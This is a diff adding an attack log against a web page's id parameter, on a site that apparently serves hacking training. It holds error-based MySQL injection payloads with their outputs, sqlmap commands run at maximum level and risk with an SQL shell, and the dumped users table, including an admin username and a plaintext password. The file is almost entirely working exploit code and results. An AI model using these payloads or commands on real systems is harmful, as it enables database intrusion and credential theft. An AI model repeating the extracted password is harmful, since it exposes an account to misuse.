@@ -1,0 +1,65 @@
+## Queries Log ##
+
+# Inject point:
+http://haai.hackeducate.com/violation.php?id=
+
+# Queries
+36' and(select 1 from(select count(*),concat((select (select concat(version())) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1--+
+5.7.18-0ubuntu0.16.04.11
+
+
+36' and(select 1 from(select count(*),concat((select (select concat(user())) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1--+
+'haai'@localhost
+
+36' and(select 1 from(select count(*),concat((select (select concat(database())) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1--+
+haai
+
+36' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,concat(column_name),0x27,0x7e) from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1--+
+user_id
+36' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,concat(column_name),0x27,0x7e) from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 1,2)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1--+
+user_name
+36' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,concat(column_name),0x27,0x7e) from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 2,3)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1--+
+user_password
+
+
+36' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,concat(user_name),0x27,0x7e) from users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1--+
+admin
+36' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,concat(user_password),0x27,0x7e) from users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1--+
+@bash=W34GS2I0YLGA!
+
+# SQLMap
+sqlmap --random-agent -u http://haai.hackeducate.com/violation.php?id= --level 5 --risk 3 --dbms mysql -p id
+
+sqlmap --random-agent -u http://haai.hackeducate.com/violation.php?id= --level 5 --risk 3 --dbms mysql -p id --sql-shell
+# SQL-Shell queries
+sql-shell> database()
+[13:55:46] [INFO] fetching SQL query output: 'database()'
+database():    'haai'
+sql-shell> select table_name from information_schema.tables where table_schema='haai';
+[13:57:38] [INFO] fetching SQL SELECT statement query output: 'select table_name from information_schema.tables where table_schema='haai''
+[13:57:38] [INFO] the SQL query used returns 3 entries
+[13:57:38] [INFO] retrieved: news
+[13:57:38] [INFO] retrieved: users
+[13:57:38] [INFO] retrieved: violations
+select table_name from information_schema.tables where table_schema='haai'; [3]:
+[*] news
+[*] users
+[*] violations
+
+sql-shell> select * from users;
+[13:57:53] [INFO] fetching SQL SELECT statement query output: 'select * from users'
+[13:57:53] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
+[13:57:53] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
+[13:57:53] [INFO] fetching current database
+[13:57:53] [INFO] fetching columns for table 'users' in database 'haai'
+[13:57:53] [INFO] the SQL query used returns 3 entries
+[13:57:53] [INFO] retrieved: "user_id","int(6)"
+[13:57:53] [INFO] retrieved: "user_name","varchar(255)"
+[13:57:53] [INFO] retrieved: "user_password","varchar(255)"
+[13:57:53] [INFO] the query with expanded column name(s) is: SELECT user_id, user_name, user_password FROM users
+[13:57:53] [INFO] the SQL query used returns 1 entries
+select * from users; [1]:
+[*] 1, admin, @bash=W34GS2I0YLGA!
+
+sql-shell>
+
